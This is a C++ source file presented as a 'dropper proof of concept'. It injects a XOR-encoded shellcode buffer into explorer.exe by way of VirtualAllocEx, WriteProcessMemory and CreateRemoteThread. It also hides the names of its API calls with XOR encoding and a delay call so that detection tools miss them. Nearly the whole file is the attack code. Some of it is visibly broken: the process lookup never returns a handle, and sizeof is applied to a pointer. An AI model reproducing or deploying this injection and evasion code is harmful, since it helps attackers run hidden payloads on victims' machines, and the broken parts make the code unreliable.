/*
    Author:    lemur
    GitHub:    https://github.com/1emvr
    Email:     1emvr@protonmail.com
    Date:      01/08/2023   11:46 AM

    Dropper proof of concept (calc.exe)
    Definitions/Prototypes: https://learn.microsoft.com/en-us/windows/win32/api

*/
#include <Windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <synchapi.h>
#include <stdio.h>
#include <stdlib.h>

#include <cstdint>
#include "carbon_b.h"

typedef LPVOID(WINAPI *VirtualAllocEx_t)(
   
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect
);
typedef BOOL(WINAPI *WriteProcessMemory_t)(
    
    HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T nSize,
    SIZE_T *lpNumberOfBytesWritten
);
typedef HANDLE(WINAPI *CreateRemoteThread_t)(
    
    HANDLE hProcess,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);
typedef DWORD(NTAPI *NtDelayExecution_t)(
        
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER DelayInterval
);

HANDLE KdciYl_jhy__bnh__(u_char processName[]) {

    int pid = 0;

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

    PROCESSENTRY32 processListEntry;
    processListEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hSnapshot, &processListEntry)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    while (Process32Next(hSnapshot, &processListEntry)) {
        if (lstrcmpiA((LPCSTR)processName, (LPCSTR)processListEntry.szExeFile) == 0) {
            pid = processListEntry.th32ProcessID;
            break;
        }
    }
}

int Dcghny_ltabli(HANDLE hProcess, u_char* _LTABLI, u_int TableSize) {

    // Delay Execution
    char sNtDelayExecutionXORed[] = { 0x40,0x7a,0x76,0x68,0x62,0x6f,0x4b,0x48,0x76,0x6b,0x51,0x78,0x7a,0x67,0x5d,0x63 };
    VA_Ng_Zh___((u_char *)sNtDelayExecutionXORed, sizeof(sNtDelayExecutionXORed), UB_fht, sizeof(UB_fht));
    NtDelayExecution_t pNtDelayExecution = (NtDelayExecution_t)GetProcAddress(GetModuleHandle((LPCWSTR)"ntdll.dll"), sNtDelayExecutionXORed);
    pNtDelayExecution(NULL, (PLARGE_INTEGER)10000);

    // Allocate shellcode memory for remote shell and ready to pass to remote thread
    LPVOID pRemoteShellcode = NULL;
    char sVirtualAllocExXORed[] = { 0x58,0x67,0x40,0x79,0x7b,0x6f,0x5e,0x4c,0x62,0x62,0x5d,0x6e,0x4b,0x76 };
    VA_Ng_Zh___(sVirtualAllocExXORed, sizeof(sVirtualAllocExXORed), UB_fht, sizeof(UB_fht));
    VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), sVirtualAllocExXORed);
    pRemoteShellcode = pVirtualAllocEx(hProcess, NULL, TableSize, MEM_COMMIT, PAGE_EXECUTE_READ);
    
    VA_Ng_Zh___(_LTABLI, sizeof(_LTABLI), UB_fht, sizeof(UB_fht));

    WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), "WriteProcessMemory");
    pWriteProcessMemory(hProcess, pRemoteShellcode, _LTABLI, TableSize, NULL);
    VA_Ng_Zh___(_LTABLI, sizeof(_LTABLI), UB_fht, sizeof(UB_fht));

    CreateRemoteThread_t pCreateRemoteThread = (CreateRemoteThread_t)GetProcAddress(GetModuleHandle((LPCWSTR)"kernel32.dll"), "CreateRemoteThread");

    HANDLE hThread = NULL;
    hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteShellcode, NULL, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, 500);
        CloseHandle(hThread);
        return 0;
    }
    return -1;
}

char VA_Ng_Zh___(char *data, int datalen, u_char* key, int keylen) {

    int j = 0;

    for (int i = 0; i < datalen; i++) {
        if (j == keylen - 1) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR LpCmdLine, int nCmdShow) {

    HANDLE hProcess = NULL;
    u_char name[] = "explorer.exe";
    u_int TableSize = sizeof(_LTABLI);

    hProcess = KdciYl_jhy__bnh__(name);

    if (hProcess != NULL) {
        Dcghny_ltabli(hProcess, _LTABLI, TableSize);
        CloseHandle(hProcess);
    }
    return 0;
}